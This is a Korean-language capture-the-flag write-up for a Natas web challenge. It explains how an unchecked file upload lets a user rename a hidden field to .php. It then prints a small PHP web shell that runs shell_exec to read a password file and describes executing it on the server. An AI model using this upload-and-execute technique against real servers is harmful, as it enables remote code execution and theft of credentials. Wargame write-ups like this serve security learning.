# Category

web

# Overview

Choose a JPEG to upload (max 1KB):

# Analysis

- 파일 형식에 대한 제한이 걸려있지 않아, 사용자가 이미지 파일을 올리지 않아도 그대로 서버에 저장된다.

- `<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />`코드가 있어 사용자가 올리는 파일의 이름이 `genRandomString()`함수에 따라 10자리 랜덤한 문자열로 변경이 되며, 확장자도 `.jpg`로 고정된다.

  ```php
  function genRandomString() {
      $length = 10;
      $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
      $string = "";

      for ($p = 0; $p < $length; $p++) {
          $string .= $characters[mt_rand(0, strlen($characters)-1)];
      }

      return $string;
  }
  ```

  `input` 태그의 `value`를 `.php`로 수정하면 사용자가 올리는 파일이 `.php`로 저장되고 해당 파일을 불러올 때 서버에서는 사용자가 올린 `.php`파일을 실행하게 된다.

# Exploitation

1. 서버에 저장되어 있는 비밀번호 읽고 화면에 출력하는 `php` 코드를 만들고 업로드 한다.

   ```php
   # solve.php
   <?php
   $output = shell_exec("cat /etc/natas_webpass/natas13");
   echo "<pre>$output</pre>";
   ?>
   ```

2. 업로드 버튼을 누르기 전 `filename`이 지정된 `input` 태그의 `value`값의 확장자를 `.php`로 변경하여 서버에 저장될 때의 확장자를 `.php`로 저장되게 변경한다.

   ```html
   <input
     type="hidden"
     name="filename"
     value="<?php print genRandomString(); ?>.php"
   />
   ```

3. 파일 업로드 후 응답에서 `The file upload/25t3phf5wq.php has been uploaded`와 같이 사용자의 php파일이 성공적으로 업로드 된 것을 알 수 있으며, 해당 파일을 누르게 되면 서버는 php파일을 인식하고 실행하여 코드에 내용에 따라 다음 비밀번호를 읽어 출력하게 된다.

# Flag

`tr...LC`
